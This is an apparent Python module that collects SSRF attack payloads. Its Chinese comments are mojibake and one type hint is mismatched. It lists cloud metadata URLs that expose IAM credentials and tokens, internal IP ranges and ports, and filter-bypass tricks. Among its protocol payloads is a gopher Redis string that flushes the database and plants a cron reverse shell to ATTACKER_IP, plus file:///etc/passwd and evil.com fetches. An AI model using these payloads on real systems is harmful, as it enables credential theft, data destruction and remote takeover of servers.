# -*- coding: utf-8 -*-
"""SSRF (Server-Side Request Forgery) Payload çæå¨.

è¦ç:
    - åç½æ¢æµ (10.x, 172.x, 192.168.x)
    - äºåæ°æ® (AWS, GCP, Azure, Alibaba Cloud)
    - åè®®å©ç¨ (gopher, dict, file)
    - Bypass é»åå
"""
from typing import List, Dict


# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
#  äºåæ°æ®å°å
# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ

CLOUD_METADATA: Dict[str, List[str]] = {
    "AWS": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance",
    ],
    "GCP": [
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "http://169.254.169.254/computeMetadata/v1/",
    ],
    "Azure": [
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
    ],
    "é¿éäº": [
        "http://100.100.100.200/latest/meta-data/",
        "http://100.100.100.200/latest/user-data/",
        "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
    ],
    "è¾è®¯äº": [
        "http://metadata.tencentyun.com/latest/meta-data/",
        "http://169.254.0.23/latest/meta-data/",
    ],
    "DigitalOcean": [
        "http://169.254.169.254/metadata/v1.json",
        "http://169.254.169.254/metadata/v1/user-data",
    ],
}


# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
#  åç½å°åæ®µ
# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ

INTERNAL_RANGES: List[str] = [
    "10.0.0.0/8",
    "172.16.0.0/12",
    "192.168.0.0/16",
    "127.0.0.0/8",
    "169.254.0.0/16",   # AWS / äºåæ°æ®
    "0.0.0.0",
    "localhost",
    "[::1]",
    "[::ffff:127.0.0.1]",
]

COMMON_INTERNAL_PORTS: Dict[str, List[int]] = {
    "Web æå¡": [80, 443, 8080, 8443, 8000, 8888, 3000, 5000, 9000],
    "æ°æ®åº": [3306, 5432, 1433, 1521, 6379, 27017, 9200],
    "ç¼å­/æ¶æ¯": [11211, 5672, 15672],
    "è¿ç»´/ç®¡ç": [22, 3389, 5900, 2375, 2376],
    "å¶ä»": [25, 53, 110, 143, 993, 995],
}


# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
#  åè®®å©ç¨ & Bypass
# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ

PROTOCOL_PAYLOADS: List[Dict[str, str]] = {
    "gopher:// (Redis)": "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a*/1 * * * * bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1%0a%0d%0a%0d%0a",
    "gopher:// (MySQL)": "gopher://127.0.0.1:3306/_...",
    "dict://": "dict://127.0.0.1:6379/info",
    "file://": "file:///etc/passwd",
    "ftp://": "ftp://evil.com/file",
    "sftp://": "sftp://evil.com:22/file",
    "tftp://": "tftp://evil.com:69/file",
}


SSRF_BYPASS: List[Dict[str, str]] = [
    {"technique": "DNS éç»å®", "payload": "ç¨ TTL=0 ç DNS å°ååè½®æ¢è§£æå° 127.0.0.1 åå¤ç½IP"},
    {"technique": "URL è§£æå·®å¼", "payload": "http://127.0.0.1:80@evil.com/  (æäºåºæ @ åé¢å½è®¤è¯ä¿¡æ¯)"},
    {"technique": "ç­ç½åéå®å", "payload": "ç¨ tinyurl.com / bit.ly æå 127.0.0.1"},
    {"technique": "30x éå®å", "payload": "å°ä½ çæå¡å¨è®¾ 302 éå®åå°åç½å°å"},
    {"technique": "è¿å¶/ç¼ç ", "payload": "127.0.0.1 â 2130706433 (åè¿å¶) â 0x7f.0.0.1 (åå­è¿å¶) â 0177.0.0.1 (å«è¿å¶)"},
    {"technique": "IPv6 æ å°", "payload": "http://[::ffff:127.0.0.1]/"},
    {"technique": "Unicode æ··æ·", "payload": "127ã0ã0ã1 (å¨è§å¥å·) â æäºåºå¯è½è§£æä¸º 127.0.0.1"},
    {"technique": "å°é­å¼å­æ¯æ°å­", "payload": "â â¡â¦","note": "ä½¿ç¨ Unicode å°é­å¼å­æ¯æ°å­"},
    {"technique": "DNS AAAA è®°å½", "payload": "ç¨ IPv6 DNS è®°å½ç»è¿ IPv4 é»åå"},
    {"technique": "localhost åä½", "payload": "localhost â localhost. â localtest.me â spoofed.burpcollaborator.net"},
]


def get_cloud_metadata(provider: str = "") -> dict:
    """è·åäºåæ°æ®å°å."""
    if provider and provider in CLOUD_METADATA:
        return {provider: CLOUD_METADATA[provider]}
    return CLOUD_METADATA


def get_internal_ranges() -> List[str]:
    """è·ååç½å°åæ®µ."""
    return INTERNAL_RANGES


def get_common_ports() -> dict:
    """è·åå¸¸è§åç½ç«¯å£."""
    return COMMON_INTERNAL_PORTS


def get_protocols() -> list:
    """è·ååè®®å©ç¨ Payload."""
    return PROTOCOL_PAYLOADS


def get_bypass() -> list:
    """è·å SSRF ç»è¿æå·§."""
    return SSRF_BYPASS
